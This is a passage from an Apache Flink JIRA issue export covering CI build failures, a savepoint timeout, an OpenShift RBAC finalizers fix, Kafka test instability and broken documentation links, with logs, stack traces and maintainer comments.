023-05-16T03:49:29.2350048Z --2023-05-16 03:49:29--  https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.24.2/crictl-v1.24.2-linux-amd64.tar.gz
2023-05-16T03:49:29.2401348Z Resolving github.com (github.com)... 140.82.121.3
2023-05-16T03:49:29.2519421Z Connecting to github.com (github.com)|140.82.121.3|:443... connected.
2023-05-16T03:49:29.2636971Z Unable to establish SSL connection.
2023-05-16T03:49:29.2717345Z tar (child): crictl-v1.24.2-linux-amd64.tar.gz: Cannot open: No such file or directory
2023-05-16T03:49:29.2718128Z tar (child): Error is not recoverable: exiting now
2023-05-16T03:49:29.2720740Z tar: Child returned status 2
2023-05-16T03:49:29.2721169Z tar: Error is not recoverable: exiting now
{noformat}

and then 
{noformat}
2023-05-16T03:51:19.7583853Z May 16 03:51:19 Starting minikube ...
2023-05-16T03:51:19.8445449Z May 16 03:51:19 * minikube v1.28.0 on Ubuntu 20.04
2023-05-16T03:51:19.8459453Z May 16 03:51:19 * Using the none driver based on user configuration
2023-05-16T03:51:19.8479317Z May 16 03:51:19 * Starting control plane node minikube in cluster minikube
2023-05-16T03:51:19.8500624Z May 16 03:51:19 * Running on localhost (CPUs=2, Memory=6943MB, Disk=85160MB) ...
2023-05-16T03:51:19.8773352Z May 16 03:51:19 * minikube 1.30.1 is available! Download it: https://github.com/kubernetes/minikube/releases/tag/v1.30.1
2023-05-16T03:51:19.8784220Z May 16 03:51:19 * To disable this notice, run: 'minikube config set WantUpdateNotification false'
2023-05-16T03:51:19.8784716Z May 16 03:51:19 
2023-05-16T03:51:20.3656967Z May 16 03:51:20 * OS release is Ubuntu 20.04.6 LTS
2023-05-16T03:52:21.7634993Z May 16 03:52:21 
2023-05-16T03:52:21.7654050Z X Exiting due to RUNTIME_ENABLE: Temporary Error: sudo crictl version: exit status 1
2023-05-16T03:52:21.7654511Z stdout:
2023-05-16T03:52:21.7654700Z 
2023-05-16T03:52:21.7654925Z stderr:
2023-05-16T03:52:21.7655194Z sudo: crictl: command not found
2023-05-16T03:52:21.7655377Z 
2023-05-16T03:52:21.7655589Z * 
2023-05-16T03:52:21.7676462Z ╭─────────────────────────────────────────────────────────────────────────────────────────────╮
2023-05-16T03:52:21.7677189Z │                                                                                             │
2023-05-16T03:52:21.7677684Z │    * If the above advice does not help, please let us know:                                 │
2023-05-16T03:52:21.7678141Z │      https://github.com/kubernetes/minikube/issues/new/choose                               │
2023-05-16T03:52:21.7678549Z │                                                                                             │
2023-05-16T03:52:21.7679208Z │    * Please run `minikube logs --file=logs.txt` and attach logs.txt to the GitHub issue.    │
2023-05-16T03:52:21.7679781Z │                                                                                             │
2023-05-16T03:52:21.7680268Z ╰─────────────────────────────────────────────────────────────────────────────────────────────╯
2023-05-16T03:52:21.7680606Z May 16 03:52:21 
2023-05-16T03:52:21.8422493Z E0516 03:52:21.841334  243032 root.go:80] failed to log command start to audit: failed to open the audit log: open /home/vsts/.minikube/logs/audit.json: permission denied
2023-05-16T03:52:21.8434631Z May 16 03:52:21 
2023-05-16T03:52:21.8447806Z X Exiting due to HOST_HOME_PERMISSION: open /home/vsts/.minikube/profiles/minikube/config.json: permission denied
2023-05-16T03:52:21.8448801Z * Suggestion: Your user lacks permissions to the minikube profile directory. Run: 'sudo chown -R $USER $HOME/.minikube; chmod -R u+wrx $HOME/.minikube' to fix
2023-05-16T03:52:21.8449545Z * Related issue: https://github.com/kubernetes/minikube/issues/9165
2023-05-16T03:52:21.8458468Z May 16 03:52:21 
2023-05-16T03:52:21.9310476Z May 16 03:52:21 
2023-05-16T03:52:21.9317664Z X Exiting due to HOST_HOME_PERMISSION: open /home/vsts/.minikube/profiles/minikube/config.json: permission denied
2023-05-16T03:52:21.9318812Z * Suggestion: Your user lacks permissions to the minikube profile directory. Run: 'sudo chown -R $USER $HOME/.minikube; chmod -R u+wrx $HOME/.minikube' to fix
2023-05-16T03:52:21.9319960Z * Related issue: https://github.com/kubernetes/minikube/issues/9165
2023-05-16T03:52:21.9324395Z May 16 03:52:21 
2023-05-16T03:52:21.9348539Z May 16 03:52:21 Command: start_kubernetes_if_not_running failed. Retrying...
2023-05-16T03:52:27.0051571Z May 16 03:52:26 
2023-05-16T03:52:27.0056411Z X Exiting due to HOST_HOME_PERMISSION: open /home/vsts/.minikube/profiles/minikube/config.json: permission denied
2023-05-16T03:52:27.0058550Z * Suggestion: Your user lacks permissions to the minikube profile directory. Run: 'sudo chown -R $USER $HOME/.minikube; chmod -R u+wrx $HOME/.minikube' to fix
2023-05-16T03:52:27.0059468Z * Related issue: https://github.com/kubernetes/minikube/issues/9165
{noformat}",,,,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-29671,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Nov 01 12:45:50 UTC 2023,,,,,,,,,,"0|z1hx68:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"16/May/23 07:31;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=48984&view=logs&j=bea52777-eaf8-5663-8482-18fbc3630e81&t=43ba8ce7-ebbf-57cd-9163-444305d74117&l=4597
;;;","30/May/23 08:27;renqs;Downgraded to major as this case hasn't popped up for two weeks.;;;","02/Aug/23 02:19;leonard;another instance: https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=51844&view=results;;;","07/Aug/23 09:07;mapohl;{quote}
another instance: https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=51844&view=results
{quote}
[~leonard] [This log line|https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=51844&view=logs&j=81be5d54-0dc6-5130-d390-233dd2956037&t=cfb9de70-be4e-5162-887e-653276e3edee&l=5229]:
{code}
error: Internal error occurred: error executing command in container: http: invalid Host header
{code}

...and the fact that the {{wget}} commands aren't executed with a {{-nv}} parameter suggests that the issue is actually related to FLINK-32632 which was fixed. The solution would be to rebase the corresponding branch to a more recent version of it's parent branch.

For this specific issue: It looks like an infrastructure issue that only appeared once. We could make CI fail earlier, though. I'm gonna label this issue as a starter task.;;;","18/Oct/23 01:18;victoryu930909;Hi，@[~mapohl] ， Does this bug only fail early? Can you assign it to me?;;;","18/Oct/23 07:19;mapohl;Is {{@victor9309}} your GitHub handle? Because there's already a PR created by {{@victor9309}} for this issue.;;;","01/Nov/23 12:45;mapohl;master: [011e3ae19b1c761f8f60eb323aa76c7fc0323f76|https://github.com/apache/flink/commit/011e3ae19b1c761f8f60eb323aa76c7fc0323f76]
1.18: [dc86179e4626ff9efacc637b85a487dd16869e05|https://github.com/apache/flink/commit/dc86179e4626ff9efacc637b85a487dd16869e05]
1.17: [3f3ec8ec44bb3cf26c09079ef0b97163a3cf8829|https://github.com/apache/flink/commit/3f3ec8ec44bb3cf26c09079ef0b97163a3cf8829];;;",,,,,,,,,,,,,,,,
Unstable connection to archive.apache.org on AZP,FLINK-32106,13536366,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Fixed,Sergey Nuyanzin,Sergey Nuyanzin,Sergey Nuyanzin,16/May/23 07:05,25/May/23 10:46,04/Jun/24 20:41,25/May/23 10:46,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Tests,,,,0,test-stability,,,"Azure pipelines fail with 
{noformat}
Using Google mirror

Resolving archive.apache.org (archive.apache.org)... 138.201.131.134, 2a01:4f8:172:2ec5::2
Connecting to archive.apache.org (archive.apache.org)|138.201.131.134|:443... failed: Connection timed out.
Connecting to archive.apache.org (archive.apache.org)|2a01:4f8:172:2ec5::2|:443... failed: Network is unreachable.
##[error]Bash exited with code '4'.

{noformat}
https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49020&view=logs&j=af184cdd-c6d8-5084-0b69-7e9c67b35f7a&t=9baa6deb-e632-5387-d76c-cf2ba9138f2e&l=16",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu May 25 10:45:56 UTC 2023,,,,,,,,,,"0|z1hx5s:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"16/May/23 07:06;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49020&view=logs&j=af885ea8-6b05-5dc2-4a37-eab9c0d1ab09&t=e811a31d-7c99-5e74-90b0-fc9fa25fddce&l=16;;;","16/May/23 07:06;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49020&view=logs&j=e9d3d34f-3d15-59f4-0e3e-35067d100dfe&t=a7382ec4-87d2-5a9d-7c53-a2f93e317458&l=16;;;","16/May/23 07:07;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49021&view=logs&j=bea52777-eaf8-5663-8482-18fbc3630e81&t=d6e79740-7cf7-5407-2e69-ca34c9be0efb&l=16;;;","25/May/23 10:45;Sergey Nuyanzin;url was changed to https://repo.maven.apache.org (same as in maven wrapper) 
;;;","25/May/23 10:45;Sergey Nuyanzin;merged as [d62ad9d24bd00c62956549688b584bddb38abf82|https://github.com/apache/flink/commit/d62ad9d24bd00c62956549688b584bddb38abf82];;;",,,,,,,,,,,,,,,,,,
Add apache/flink-training release to docs about creating a Flink release,FLINK-32105,13536365,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,alpinegizmo,mapohl,mapohl,16/May/23 07:02,16/May/23 07:03,04/Jun/24 20:41,,1.18.0,,,,,,,,,,,,,,,,,,,,Documentation,Documentation / Training,,,0,,,,"We have links in the Flink docs (see FLINK-32096) that refer to [apache/flink-training|https://github.com/apache/flink-training]. These are broken after a Flink release. Some steps are necessary to make them work again.

We should make these steps being part of the [Flink Release Creation docs|https://cwiki.apache.org/confluence/display/FLINK/Creating+a+Flink+Release] to avoid having broken links.",,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-32096,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-16 07:02:05.0,,,,,,,,,,"0|z1hx5k:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
stop-with-savepoint fails and times out with simple reproducible example,FLINK-32104,13536353,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Invalid,,kurto,kurto,16/May/23 04:07,16/May/23 11:58,04/Jun/24 20:41,16/May/23 11:58,1.17.0,,,,,,,,,,,,,,,,,,,,API / DataStream,,,,0,,,,"I've put together a simple demo app that reproduces the issue with instructions on how to reproduce:

[https://github.com/kurtostfeld/flink-stop-issue]

 

The issue is that with a very simple Flink DataStream API application, the `stop-with-savepoint` fails and times out like this:

 
{code:java}
./bin/flink stop --type native --savepointPath ../savepoints d69a952625497cca0665dfdcdb9f4718

Suspending job ""d69a952625497cca0665dfdcdb9f4718"" with a NATIVE savepoint.

------------------------------------------------------------
 The program finished with the following exception:

org.apache.flink.util.FlinkException: Could not stop with a savepoint job ""d69a952625497cca0665dfdcdb9f4718"".
    at org.apache.flink.client.cli.CliFrontend.lambda$stop$4(CliFrontend.java:595)
    at org.apache.flink.client.cli.CliFrontend.runClusterAction(CliFrontend.java:1041)
    at org.apache.flink.client.cli.CliFrontend.stop(CliFrontend.java:578)
    at org.apache.flink.client.cli.CliFrontend.parseAndRun(CliFrontend.java:1110)
    at org.apache.flink.client.cli.CliFrontend.lambda$mainInternal$9(CliFrontend.java:1189)
    at org.apache.flink.runtime.security.contexts.NoOpSecurityContext.runSecured(NoOpSecurityContext.java:28)
    at org.apache.flink.client.cli.CliFrontend.mainInternal(CliFrontend.java:1189)
    at org.apache.flink.client.cli.CliFrontend.main(CliFrontend.java:1157)
Caused by: java.util.concurrent.TimeoutException
    at java.base/java.util.concurrent.CompletableFuture.timedGet(CompletableFuture.java:1886)
    at java.base/java.util.concurrent.CompletableFuture.get(CompletableFuture.java:2021)
    at org.apache.flink.client.cli.CliFrontend.lambda$stop$4(CliFrontend.java:591)
    ... 7 more {code}
 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue May 16 11:58:17 UTC 2023,,,,,,,,,,"0|z1hx2w:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"16/May/23 05:47;Weijie Guo;Hi Kurt, 

I have tested the uploaded job without any code change. However the native savepoint completed successfully on my own macbook. I'm worried that the timeout comes from prolonged sleep in {{DemoMapFunction}}.

{{NumberSequenceSource}} will be finished soon after the job submitted, and the recoed(i.e. 1...20) will accumulate in the downstream's received buffers. Savepoint will be inserted as the last record, and the previous data processing time will be {{20 * 5 = 100s}}, but {{client.timeout}} defaults to only 60s. If a savepoint is submitted before most of the data is processed, there is a high probability that it will directly timeout. Have you tried increasing the timeout here?
;;;","16/May/23 11:58;kurto;[~Weijie Guo] , thank you so much for your help. If I move the sleep before the keyBy, I can suspend. Thanks!;;;",,,,,,,,,,,,,,,,,,,,,
RBAC flinkdeployments/finalizers missing for OpenShift Deployment,FLINK-32103,13536319,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,jbusche,jbusche,jbusche,15/May/23 21:16,19/May/23 06:33,04/Jun/24 20:41,19/May/23 06:33,kubernetes-operator-1.5.0,,,,,,,,,,,,,,kubernetes-operator-1.6.0,,,,,,Kubernetes Operator,,,,0,,,,"In OpenShift 4.10 and above, I'm noticing with the Flink 1.5.0 RC release that there's an issue with flinkdeployments on OpenShift.  Flinkdeployments are stuck in upgrading:
{quote}oc get flinkdep

NAME                                    JOB STATUS   LIFECYCLE STATE

basic-example                                        UPGRADING
{quote}
 

The error message looks like:
{quote}oc describe flinkdep basic-example

....

Error:                          {""type"":""org.apache.flink.kubernetes.operator.exception.ReconciliationException"",""message"":""org.apache.flink.client.deployment.ClusterDeploymentException: Could not create Kubernetes cluster \""basic-example\""."",""throwableList"":[\{""type"":""org.apache.flink.client.deployment.ClusterDeploymentException"",""message"":""Could not create Kubernetes cluster \""basic-example\"".""},\{""type"":""org.apache.flink.kubernetes.shaded.io.fabric8.kubernetes.client.KubernetesClientException"",""message"":""Failure executing: POST at: https://172.30.0.1/apis/apps/v1/namespaces/default/deployments. Message: Forbidden!Configured service account doesn't have access. Service account may have been revoked. deployments.apps \""basic-example\"" is forbidden: cannot set blockOwnerDeletion if an ownerReference refers to a resource you can't set finalizers on: , <nil>.""}]}

 

 Job Manager Deployment Status:  MISSING
{quote}
 

The solution is to fix it in the rbac.yaml of the helm template, adding a ""  - flinkdeployments/finalizers"" line to the flink.apache.org apiGroup.

 

If the Operator is already running and flinkdeployments are having trouble on OpenShift, then someone can manually edit the flink-kubernetes-operator.v1.5.0 clusterrole and add the

""  - flinkdeployments/finalizers"" in the flink.apache.org apiGroup.

 

I'll create a PR that addresses this.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri May 19 06:33:58 UTC 2023,,,,,,,,,,"0|z1hwvk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"16/May/23 01:04;jbusche;Created PR [https://github.com/apache/flink-kubernetes-operator/pull/600] to address this;;;","16/May/23 01:06;jbusche;Can fix this on an existing OpenShift install by adding ""- flinkdeployments/finalizers"" to the flink.apache.org resources like this:
{quote}oc edit clusterrole flink-operator
 - apiGroups:

  - flink.apache.org

  resources:

  - flinkdeployments

  - flinkdeployments/status

  - flinkdeployments/finalizers

  - flinksessionjobs

  - flinksessionjobs/status

  verbs:

  - '*'
{quote};;;","19/May/23 06:33;gyfora;merged to main 0edb5443bf38c7a2dd5ada56f10301e4799f9b35;;;",,,,,,,,,,,,,,,,,,,,
Aggregate multiple pendingRecords metric per source if present,FLINK-32102,13536282,,Improvement,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,mxm,mxm,mxm,15/May/23 15:15,02/Aug/23 15:32,04/Jun/24 20:41,16/May/23 17:22,kubernetes-operator-1.4.0,,,,,,,,,,,,,,kubernetes-operator-1.6.0,,,,,,Autoscaler,Kubernetes Operator,,,0,,,,"Some source expose multiple {{.pendingRecords}} metrics. If that is the case, we must sum up these records to yield the correct internal pending records count.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-15 15:15:03.0,,,,,,,,,,"0|z1hwnk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
FlinkKafkaInternalProducerITCase.testInitTransactionId test failed,FLINK-32101,13536229,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Cannot Reproduce,,tanyuxin,tanyuxin,15/May/23 13:06,16/Oct/23 06:45,04/Jun/24 20:41,16/Oct/23 06:45,1.18.0,,,,,,,,,,,,,,,,,,,,Connectors / Kafka,,,,0,auto-deprioritized-major,test-stability,,"FlinkKafkaInternalProducerITCase.testInitTransactionId test failed.

      Caused by: org.apache.kafka.common.KafkaException: Unexpected error in InitProducerIdResponse; The request timed out.


https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=48990&view=logs&j=aa18c3f6-13b8-5f58-86bb-c1cffb239496&t=502fb6c0-30a2-5e49-c5c2-a00fa3acb203&l=22973

{code:java}
Caused by: org.apache.kafka.common.KafkaException: org.apache.kafka.common.KafkaException: Unexpected error in InitProducerIdResponse; The request timed out.
	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)
	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
	at java.lang.reflect.Constructor.newInstance(Constructor.java:423)
	at java.util.concurrent.ForkJoinTask.getThrowableException(ForkJoinTask.java:593)
	at java.util.concurrent.ForkJoinTask.reportException(ForkJoinTask.java:677)
	at java.util.concurrent.ForkJoinTask.invoke(ForkJoinTask.java:735)
	at java.util.stream.ForEachOps$ForEachOp.evaluateParallel(ForEachOps.java:159)
	at java.util.stream.ForEachOps$ForEachOp$OfRef.evaluateParallel(ForEachOps.java:173)
	at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:233)
	at java.util.stream.ReferencePipeline.forEach(ReferencePipeline.java:485)
	at java.util.stream.ReferencePipeline$Head.forEach(ReferencePipeline.java:650)
	at org.apache.flink.streaming.connectors.kafka.FlinkKafkaProducer.abortTransactions(FlinkKafkaProducer.java:1290)
	at org.apache.flink.streaming.connectors.kafka.FlinkKafkaProducer.initializeState(FlinkKafkaProducer.java:1216)
	at org.apache.flink.streaming.util.functions.StreamingFunctionUtils.tryRestoreFunction(StreamingFunctionUtils.java:189)
	at org.apache.flink.streaming.util.functions.StreamingFunctionUtils.restoreFunctionState(StreamingFunctionUtils.java:171)
	at org.apache.flink.streaming.api.operators.AbstractUdfStreamOperator.initializeState(AbstractUdfStreamOperator.java:95)
	at org.apache.flink.streaming.api.operators.StreamOperatorStateHandler.initializeOperatorState(StreamOperatorStateHandler.java:122)
	at org.apache.flink.streaming.api.operators.AbstractStreamOperator.initializeState(AbstractStreamOperator.java:274)
	at org.apache.flink.streaming.runtime.tasks.RegularOperatorChain.initializeStateAndOpenOperators(RegularOperatorChain.java:106)
	at org.apache.flink.streaming.runtime.tasks.StreamTask.restoreGates(StreamTask.java:747)
	at org.apache.flink.streaming.runtime.tasks.StreamTaskActionExecutor$SynchronizedStreamTaskActionExecutor.call(StreamTaskActionExecutor.java:100)
	at org.apache.flink.streaming.runtime.tasks.StreamTask.restoreInternal(StreamTask.java:722)
	at org.apache.flink.streaming.runtime.tasks.StreamTask.restore(StreamTask.java:688)
	at org.apache.flink.runtime.taskmanager.Task.runWithSystemExitMonitoring(Task.java:952)
	at org.apache.flink.runtime.taskmanager.Task.restoreAndInvoke(Task.java:921)
	at org.apache.flink.runtime.taskmanager.Task.doRun(Task.java:745)
	at org.apache.flink.runtime.taskmanager.Task.run(Task.java:562)
	at java.lang.Thread.run(Thread.java:748)
Caused by: org.apache.kafka.common.KafkaException: Unexpected error in InitProducerIdResponse; The request timed out.
	at org.apache.kafka.clients.producer.internals.TransactionManager$InitProducerIdHandler.handleResponse(TransactionManager.java:1418)
	at org.apache.kafka.clients.producer.internals.TransactionManager$TxnRequestHandler.onComplete(TransactionManager.java:1322)
	at org.apache.kafka.clients.ClientResponse.onComplete(ClientResponse.java:109)
	at org.apache.kafka.clients.NetworkClient.completeResponses(NetworkClient.java:583)
	at org.apache.kafka.clients.NetworkClient.poll(NetworkClient.java:575)
	at org.apache.kafka.clients.producer.internals.Sender.maybeSendAndPollTransactionalRequest(Sender.java:418)
	at org.apache.kafka.clients.producer.internals.Sender.runOnce(Sender.java:316)
	at org.apache.kafka.clients.producer.internals.Sender.run(Sender.java:243)
	... 1 more

{code}

",,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-31145,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Aug 18 22:35:07 UTC 2023,,,,,,,,,,"0|z1hwbs:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"15/May/23 13:57;mapohl;[~tanyuxin] this looks like a Kafka-internal instability, doesn't it? We're collecting these kind of errors under the umbrella issue FLINK-31145. I'm gonna link FLINK-31145 at least in case it is related.;;;","16/May/23 02:21;tanyuxin;[~mapohl] Yes, exactly. Thanks for tracking it.;;;","10/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issues has been marked as Major but is unassigned and neither itself nor its Sub-Tasks have been updated for 60 days. I have gone ahead and added a ""stale-major"" to the issue"". If this ticket is a Major, please either assign yourself or give an update. Afterwards, please remove the label or in 7 days the issue will be deprioritized.
;;;","18/Aug/23 22:35;flink-jira-bot;This issue was labeled ""stale-major"" 7 days ago and has not received any updates so it is being deprioritized. If this ticket is actually Major, please raise the priority and ask a committer to assign you the issue or revive the public discussion.
;;;",,,,,,,,,,,,,,,,,,,
Max parallelism is incorrectly calculated with multiple topics,FLINK-32100,13536214,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,mxm,mxm,mxm,15/May/23 10:57,02/Aug/23 15:32,04/Jun/24 20:41,16/May/23 17:22,kubernetes-operator-1.4.0,,,,,,,,,,,,,,kubernetes-operator-1.6.0,,,,,,Autoscaler,Kubernetes Operator,,,0,,,,"So far, we've taken the max number partitions we can find. However, the correct way to calculate the
max source parallelism would be to sum the number of partitions of all topis.
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-15 10:57:37.0,,,,,,,,,,"0|z1hw8g:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
create flink_data volume for operations playground,FLINK-32099,13536188,,Improvement,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Implemented,,danderson,danderson,15/May/23 07:50,15/May/23 08:01,04/Jun/24 20:41,15/May/23 08:01,1.17.0,,,,,,,,,,,,,,1.17.1,,,,,,Documentation / Training / Exercises,,,,0,,,,The docker-based operations playground instructs the user to create temp directories on the host machine for checkpoints and savepoints that are then mounted in the containers. This can be problematic on windows machines. It would be better to use a docker volume.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon May 15 07:59:12 UTC 2023,,,,,,,,,,"0|z1hw2o:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"15/May/23 07:59;danderson;fixed in playground master with d0ce3d855305bf602a558aee1049d7e37c86c895

flink docs updated in master with cad7e60081bf1fc91aeb70d890bca1267a34eb2d;;;",,,,,,,,,,,,,,,,,,,,,,
Dispatcher#submitJob calls Dispatcher#isInGloballyTerminalState up to three times which might be expensive due to IO,FLINK-32098,13536187,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,Weijie Guo,mapohl,mapohl,15/May/23 07:48,01/Aug/23 09:37,04/Jun/24 20:41,01/Aug/23 09:37,1.16.1,1.17.0,1.18.0,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,,,,0,pull-request-available,,,"{{Dispatcher#submitJob}} calls {{Dispatcher#isInGloballyTerminalState}} up to three times (1x through {{Dispatcher#isDuplicateJob}} and 2x directly) which calls {{JobResultStore#hasJobResultStore}}. {{hasJobResultStore}} calls {{hasDirtyJobResultEntry}} and {{hasCleanJobResultEntry}} if the underlying job hasn't completed globally, yet. Both calls run {{FileSystem#exists}} on an non-existing file which can be a quite expensive operation (depending on the {{FileSystem}} implementation for object storage) since it might require a full table scan.

tbh, so far, nobody complained. But we might want to either reconsider the {{FileSystemJobResultStore}}/{{JobResultStore#hasJobResultEntry}} implementation or, at least, reduce the number of {{isInGloballyTerminalState}} in the {{Dispatcher}} and document the performance issue in the JavaDoc.",,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-27204,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Aug 01 09:37:51 UTC 2023,,,,,,,,,,"0|z1hw2g:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"15/May/23 07:50;mapohl;I'm linking FLINK-27204 which covers moving all the JobResultStore method calls into async calls.;;;","15/May/23 09:07;Weijie Guo;Perhaps it is possible to maintain a simple cache in the {{FileSystemJobResultStore}}, but it is uncertain whether this would have sufficient benefits, given that it would introduce some additional complexity. I will see if reduce the number of {{isInGloballyTerminalState}} in the {{Dispatcher}} is enough to solve the problem.;;;","01/Aug/23 09:37;mapohl;master: c6d58e17e8ce736a062234e1558ac8d7b65990ef;;;",,,,,,,,,,,,,,,,,,,,
Implement support for Kinesis deaggregation,FLINK-32097,13536185,13404461,Sub-task,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,liangtl,liangtl,15/May/23 07:32,02/Feb/24 10:10,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,,,,,0,,,,Implement support for KPL aggregation on UserRecord.,,,,,,,,,,FLINK-31813,,FLINK-31989,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-15 07:32:53.0,,,,,,,,,,"0|z1hw20:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Flink 1.17 doc points to non-existant branch in flink-training repo,FLINK-32096,13536175,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,yunta,samrat007,samrat007,15/May/23 07:08,16/May/23 07:03,04/Jun/24 20:41,15/May/23 08:36,1.17.0,,,,,,,,,,,,,,,,,,,,Documentation,Documentation / Training / Exercises,,,0,,,,"There is one broken link in Flink documentation which i think needs commiter or PMC privileges.
In [Hands-on|https://nightlies.apache.org/flink/flink-docs-stable/docs/learn-flink/etl/#hands-on] section

>  The hands-on exercise that goes with this section is the Rides and Fares .

[Rides and Fares|https://github.com/apache/flink-training/blob/release-1.17//rides-and-fares] points to non-existent branch in flink-training repo and leads to 404 (Not Found)  [hyper-link|https://github.com/apache/flink-training/blob/release-1.17//rides-and-fares]. This is due to missing `release-1.17` branch in [flink-training|https://github.com/apache/flink-training/] repo.
